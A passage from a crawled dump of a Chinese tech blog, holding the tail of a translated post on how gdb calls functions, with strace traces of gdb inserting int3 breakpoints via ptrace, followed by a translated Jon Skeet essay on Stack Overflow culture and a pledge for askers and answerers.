margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n// 改变 0x400528 处的指令\r\n25622 ptrace(PTRACE_PEEKTEXT, 25618, 0x400528, [0x5d00000003b8e589]) = 0\r\n25622 ptrace(PTRACE_POKEDATA, 25618, 0x400528, 0x5d00000003cce589) = 0\r\n// 开始运行程序\r\n25622 ptrace(PTRACE_CONT, 25618, 0x1, SIG_0) = 0\r\n// 当到达断点时获取一个信号\r\n25622 ptrace(PTRACE_GETSIGINFO, 25618, NULL, {si_signo=SIGTRAP, si_code=SI_KERNEL, si_value={int=-1447215360, ptr=0x7ffda9bd3f00}}) = 0\r\n// 将 0x400528 处的指令更改为之前的样子\r\n25622 ptrace(PTRACE_PEEKTEXT, 25618, 0x400528, [0x5d00000003cce589]) = 0\r\n25622 ptrace(PTRACE_POKEDATA, 25618, 0x400528, 0x5d00000003b8e589) = 0</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd93116420112-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd93116420112-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd93116420112-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd93116420112-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd93116420112-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd93116420112-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd93116420112-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd93116420112-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd93116420112-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd93116420112-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd93116420112-1\"><span class=\"crayon-c\">// 改变 0x400528 处的指令</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd93116420112-2\"><span class=\"crayon-cn\">25622</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ptrace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">PTRACE_PEEKTEXT</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">25618</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x400528</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0x5d00000003b8e589</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd93116420112-3\"><span class=\"crayon-cn\">25622</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ptrace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">PTRACE_POKEDATA</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">25618</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x400528</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x5d00000003cce589</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd93116420112-4\"><span class=\"crayon-c\">// 开始运行程序</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd93116420112-5\"><span class=\"crayon-cn\">25622</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ptrace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">PTRACE_CONT</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">25618</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">SIG_0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd93116420112-6\"><span class=\"crayon-c\">// 当到达断点时获取一个信号</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd93116420112-7\"><span class=\"crayon-cn\">25622</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ptrace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">PTRACE_GETSIGINFO</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">25618</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">si_signo</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">SIGTRAP</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">si_code</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">SI_KERNEL</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">si_value</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">{</span><span class=\"crayon-t\">int</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1447215360</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ptr</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0x7ffda9bd3f00</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd93116420112-8\"><span class=\"crayon-c\">// 将 0x400528 处的指令更改为之前的样子</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd93116420112-9\"><span class=\"crayon-cn\">25622</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ptrace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">PTRACE_PEEKTEXT</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">25618</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x400528</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0x5d00000003cce589</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd93116420112-10\"><span class=\"crayon-cn\">25622</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ptrace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">PTRACE_POKEDATA</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">25618</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x400528</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x5d00000003b8e589</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0030 seconds] -->\r\n<p></p>\n<h2 id=\"toc_9\">在某处放置一条陷阱指令</h2>\n<p>当 gdb 运行一个函数的时候，它也会在某个地方放置一条陷阱指令。这是其中一条。它基本上是用 <code>cc</code> 来替换一条指令（<code>int3</code>）。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9315fd97621630403\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n5908  ptrace(PTRACE_PEEKTEXT, 5810, 0x7f6fa7c0b260, [0x48f389fd89485355]) = 0\r\n5908  ptrace(PTRACE_PEEKTEXT, 5810, 0x7f6fa7c0b260, [0x48f389fd89485355]) = 0\r\n5908 ptrace(PTRACE_POKEDATA, 5810, 0x7f6fa7c0b260, 0x48f389fd894853cc) = 0</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd97621630403-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd97621630403-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd97621630403-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd97621630403-1\"><span class=\"crayon-cn\">5908</span><span class=\"crayon-h\">  </span><span class=\"crayon-e\">ptrace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">PTRACE_PEEKTEXT</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5810</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x7f6fa7c0b260</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0x48f389fd89485355</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd97621630403-2\"><span class=\"crayon-cn\">5908</span><span class=\"crayon-h\">  </span><span class=\"crayon-e\">ptrace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">PTRACE_PEEKTEXT</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5810</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x7f6fa7c0b260</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0x48f389fd89485355</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd97621630403-3\"><span class=\"crayon-cn\">5908</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ptrace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">PTRACE_POKEDATA</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5810</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x7f6fa7c0b260</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x48f389fd894853cc</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p><code>0x7f6fa7c0b260</code> 是什么？我查看了进程的内存映射，发现它位于 <code>/lib/x86_64-linux-gnu/libc-2.23.so</code> 中的某个位置。这很奇怪，为什么 gdb 将陷阱指令放在 libc 中？</p>\n<p>让我们看一看里面的函数是什么，它是 <code>__libc_siglongjmp</code> 。其他 gdb 放置陷阱指令的地方的函数是 <code>__longjmp</code> 、<code>___longjmp_chk</code> 、<code>dl_main</code> 和 <code>_dl_close_worker</code> 。</p>\n<p>为什么？我不知道！也许出于某种原因，当函数 <code>foo()</code> 返回时，它调用 <code>longjmp</code> ，从而 gdb 能够进行返回控制。我不确定。</p>\n<h1 id=\"toc_10\">gdb 如何调用函数是很复杂的！</h1>\n<p>我将要在这儿停止了（现在已经凌晨 1 点），但是我知道的多一些了！</p>\n<p>看起来“gdb 如何调用函数”这一问题的答案并不简单。我发现这很有趣并且努力找出其中一些答案，希望你也能够找到。</p>\n<p>我依旧有很多未回答的问题，关于 gdb 是如何完成这些所有事的，但是可以了。我不需要真的知道关于 gdb 是如何工作的所有细节，但是我很开心，我有了一些进一步的理解。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113938\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113938votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113938\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "C/C++,GDB", "url": "http://blog.jobbole.com/113938/", "url_obj_id": "61fa89b1048f81486fc4d24533306dce"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2016/03/6dd085bf97f82f786b71b4fbcdb37e88.jpg"], "title": "如何成为 StackOverflow 上合格的提问者与回答者", "create_date": "2018/07/09 ·", "praise_num": 1, "fav_num": 0, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/wx232824506\">学以致用123</a> 翻译，<a href=\"http://www.jobbole.com/members/liuchang\">刘唱</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://codeblog.jonskeet.uk/2018/03/17/stack-overflow-culture/\">JONSKEET</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>写这篇文章最直接的原因是我的朋友 Rob Conery 发了一条<a href=\"https://twitter.com/robconery/status/974678531832610816\">推特</a>，解释他为什么放弃在 Stack Overflow 贡献答案。</p>\n<p>然而，那已经是很长时间的事了。前不久，我开始写一篇与本文类似的文章，但是文章越写越长，并且没有得出任何结论。现在我用一个小时的时间写这篇文章，然后不论写了什么都要发出去（稍后可能会重新排版）。</p>\n<p>我了解很多用户对 Stack Overflow 的复杂感情。有些人认为它完全没有价值，但是我相信更多的人认为它“资源有价值，但是潜在的反对意见让人很难做出贡献”。有些人则定期做出贡献，在合理的时间范围内，偶尔解释或者查看反对意见。</p>\n<p>这篇文章，我将谈谈我的经历，和我的一些看法，关于 Stack Overflow 存在的问题、我对一些察觉到的问题持反对态度、和如何改善目前的状况。下面是我希望在二月份拜访 Stack Overflow 团队时详细讨论的主题，但我们却忙于<a href=\"https://stackoverflow.blog/2018/03/14/podcast-123-jon-skeet-wants-you-to-be-a-feminist/\">讨论其它重要问题</a>。</p>\n<p>在这篇文章中，我大部分讨论的是”提问者” 和 “回答者”，这是特意进行的简化。许多用户可能既是求助者又是回答者，我很多时候还会用不写答案但是用“view” 写评论的方式成为回答者。尽管任何用户都可以担任不同的角色，但是对提交的每个问题，每个人通常只有一个角色。当然还有其他的角色，例如“评论其它答案的评论者”，我不想花费过多的时间讨论这个问题。</p>\n<h3>目标和期望的差距</h3>\n<p>与生活中大多数事情相似，当所有人目标一致时 Stack Overflow 的表现最好，因为我们可以共同迈向那个目标。相反，当人们的目标不同时则通常会出现问题。</p>\n<p>对于 Stack Overflow 而言，最普遍的问题在于这两个目标的差异：</p>\n<ul>\n<li>– 提问者：尽量减少解决面临的问题所需要的时间</li>\n<li>– 回答者：最大限度地提高网站所有问题的价值，将网站视为长久的资源</li>\n</ul>\n<p>就我而言，我经常有一个“试图帮助提高软件工程师的诊断能力，使他们能够更好地解决自己的问题”的子目标。</p>\n<p>例如，考虑这个问题（编造的，但并不牵强） ：</p>\n<blockquote><p>Random 总是返回相同的数值，它出问题了吗？</p></blockquote>\n<p>在我看来这是一个低质量的问题（稍后我将对其进行详细讨论）。我基本知道哪里存在问题，但是为了达到我的目标我希望提问者改善这个问题，我希望看到他们的代码、结果等。如果我的答案是正确的（快速连续创建多个使用相同的基于系统时间的种子的 System.Random 的多个实例），那么这个问题很可能由于重复而被关闭，并且很可能被删除。以现在的形式，这个问题对网站没有任何好处。我不想没有确定是否重复之前就将这个问题以重复的原因关闭。</p>\n<p>现在，从提问者的角度来看，这些并不重要。如果他们知道我知道问题可能出现在哪，他们可能会认为我应该告诉他们，以便他们可以继续工作。如果现在就可以得到答案，为什么还需要花费 10 分钟来重现问题？更糟糕的是，如果他们花时间做了这些事情，然后由于重复的原因又立刻关闭这个问题，这样看上去很像在浪费时间。</p>\n<p>如果忽略情绪，我认为时间没有被浪费：</p>\n<ul>\n<li>– 提问者可以了解到，提出一个清晰的问题可以更快的得到答案。</li>\n<li>– 提问者可以了解到，搜索重复问题很有价值，因为这可能意味着根本不需要提出这个问题。</li>\n</ul>\n<p>但是我们都是普通人，忽略感情显然是个不可取的方法。在这种情况下可能发生的情况是 ( 即使我始终很有礼貌) 提问者会认为 Stack Overflow 中到处是只关心自己权利的“交警”。 我当然可以认为这是不公平的（虽然这可能会突出我的实际目标 ） 但这可能无法改变任何人的想法。</p>\n<p>因此，这是个问题。Stack Overflow 社区认同网站的目标，那么在用户提出问题时向用户明确说明网站的目标了吗？ 值得注意的是<a href=\"https://stackoverflow.com/tour\">导航页面</a>(奇怪的是网站首页没有设置该链接) 包含以下内容：</p>\n<blockquote><p>在您的帮助下，我们正在共同努力，为每个关于编程的问题建立一个详细答案库。</p></blockquote>\n<p>我倾向于稍作更改：</p>\n<blockquote><p>Stack Overflow 的目标在于创建高质量的问题库以及问题的高质量答案库。</p></blockquote>\n<p>这真的是一个共同愿景吗？如果提问者意识到这点，会有帮助吗？我是希望如此，但是我怀疑它会阻止掉所有问题（我不认为有什么能做到阻止所有问题的提问，世界不是一个完美的地方）。</p>\n<p>让我们转到另一个我与其他人有不同意见的话题：低质量问题。</p>\n<h3>是的，存在低质量问题</h3>\n<p>即使不能以完全客观的方式衡量，我也敢肯定有高质量问题和低质量问题（还有很多介于中间的）。</p>\n<p>我认为 Stack Overflow 中这样的问题可以看做高质量问题：</p>\n<ul>\n<li>– 提出一个问题，并且明确知道该问题的要求。这个问题应该能够非常明显地看出答案是否回答了问题（这与答案是否正确无关）</li>\n<li>– 避免无关紧要。这可能很困难，但是我认为这是有效工作的一部分：如果在开发 web 应用程序时遇到问题，至少应该尝试确定 web 应用程序的上下文是否与问题有关。</li>\n<li>– 对其他人尽量有帮助。这是避免不相关因素的非常重要的原因。很多用户需要将字符串解析为日期。较少人需要使用 X 框架的 Y 版本通过定制及专有网络协议与 COBOL 编写的客户端交互时将字符串解析为日期。</li>\n<li>– 阐述提问者进行过的尝试、进展以及卡住的位置。</li>\n<li>– 在适当的情况下（通常情况）包含一个证明问题的小例子。</li>\n<li>– 格式正确。不要使用整页的段落，不要使用没有格式化的代码等等。</li>\n</ul>\n<p>Stack Overflow 上有很多符合所有这些要求的问题，或符合以上大部分要求的问题。</p>\n<p>我有理由认为这样的问题比另外一些问题质量高，一些问题可能只是一个家庭作业的照片。我曾经见过这样的问题，虽然，它们并不总是那么糟糕，但是我真的不知道如果这都不能认为是一个低质量的问题，我们还能达成什么一致意见。</p>\n<p>当然，在此之间还有很多问题——但我认为接受存在低质量问题的观点非常重要，或者至少经过讨论并找出不同意见。</p>\n<h3>经验有助于写出好问题，但并非绝对必要</h3>\n<p>我看过许多文章声称 Stack Overflow 对于新用户来讲过于困难，因为，新用户很难写出一个好问题。</p>\n<p>我认为接受网站协议并愿意为之付出努力的新人，至少能提出一个合理的问题。他们可能需要花费更长的时间进行研究并写出问题，而且写出的问题可能不会像有经验的人在相同情况下写出的问题那样简单。但是我相信，整体而言，新用户能够写出质量足够好的问题。他们可能没有意识到他们需要做什么或者为什么这样做，但这是一个拥有不同解决方案的问题。而不仅仅是”提问者可能是技术新手，所以我们需要回答没有任何帮助的糟糕问题”。</p>\n<p>一个稍稍不同的问题是用户是否具有写出真正优秀问题所需的诊断技能。这是一个<a href=\"https://codeblog.jonskeet.uk/2017/08/17/diagnostics-everywhere/\">我非常重视的话题</a>，而且我真的希望有一个好的解决方案，但是我真的没有。我坚信，帮助程序员提高自己的诊断能力，除了在 Stack Overflow 中提出更好的问题之外，将对他们有巨大的好处。</p>\n<h3>一些用户在 Stack Overflow 的表现像个混蛋，但是大多数人不会这样</h3>\n<p>我当然不会宣称 Stack Overflow 社区是完美的。我看到过一些用户对提出低质量问题的人非常无理，我不是要为此进行申辩。如果你看我非常不礼貌，那么请阻止我。我不认为要求改进问题本身是粗鲁的，我们可以非常礼貌地要求改进问题，也可以非常刻薄地要求改进问题。我完全赞成提高 Stack Overflow 的文明水平，但是我认为这不能以牺牲网站质量为代价。</p>\n<p>我还经历过要求提问者提供更多信息时，提问者的反应非常无理的情况。这不是一个单向的问题。在这个方向上，我看到过比回答者更加粗鲁的行为。事实上，这些问题通常被关闭或删除，所以只是随便浏览网站的人通常不会看到这些。</p>\n<p>我的时间非常有限，所以我们来看最重要的一点，我们需要对彼此更友好。</p>\n<h3>Jon 的 Stack Overflow 宣誓</h3>\n<p>我故意把它称为<em>我的</em>宣誓，因为这不是将我的要求强加于他人的地方。如果你认为这也是你想遵循的原则（或许有一些修正），那再好不过了。如果 Stack Overflow 决定在网站指南的某个地方采用它，我非常欢迎，并且他们可以对其做任何适当的修改。</p>\n<p>从本质上来讲，我认为许多问题看起来像是提问者和回答者之间的一种交易。因此，建立一种契约是合理的（虽然这听起来更像是商业用语），因此，我倾向于使用一个诚心的宣誓。</p>\n<p><strong>作为一个回答者，我将…</strong></p>\n<ul>\n<li>不表现的像个混蛋。</li>\n<li>记住我正在回应的是人，是有感情的。</li>\n<li>认定我正在回应的人是诚心地希望得到帮助。</li>\n<li>要明确，对问题质量的评论不是对提问者的价值的指责。</li>\n<li>记住，有些时候，我正在回应的人可能会感到他们正在被指责，即使我不认为我有这个意思。</li>\n<li>要明确，评论如何改善问题时提出积极的具体建议，不要消极地强调现状。</li>\n<li>答案要清楚，记住不是每个人都与我的技术背景相同（所以有些术语可能需要链接等)。</li>\n<li>花点时间好好展示我的答案，使用尽可能易读的格式。</li>\n</ul>\n<p><strong>作为一个提问者，我将… </strong></p>\n<ul>\n<li>不表现的像个混蛋。</li>\n<li>记住任何一个回答问题的都是人类，都是有感情的。</li>\n<li>认定任何一个回答我问题的人都充满善意并试图帮助我。</li>\n<li>记住我是在要求其他人放弃自己的时间来帮助我解决问题。</li>\n<li>在提问之前先研究自己的问题、尽可能的缩小问题范围、给出尽可能详细的相关信息来减少回答问题的人需要花费的时间。</li>\n<li>花点时间好好提出自己的问题，使用尽可能易读的格式。</li>\n</ul>\n<p>我希望大部分时间我可以遵循这些誓言。我怀疑自己有时候做不到，所有希望通过明确的写出来，阅读它，使自己成为一个更好的社区成员。</p>\n<p>我认为如果每个人在 Stack Overflow 上发布任何内容之前都遵循这样的誓言，我们的社区将会更加美好。</p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我翻译更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏译者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我翻译更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/10/11eefac5bf4ae36c73b7b40eb087be7b.jpg\">\n            \n                            <img src=\"http://jbcdn2.b0.upaiyun.com/2016/10/02a9f7817f8dd0012ff1327fde5bdc94.jpg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114166\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114166votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114166\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style 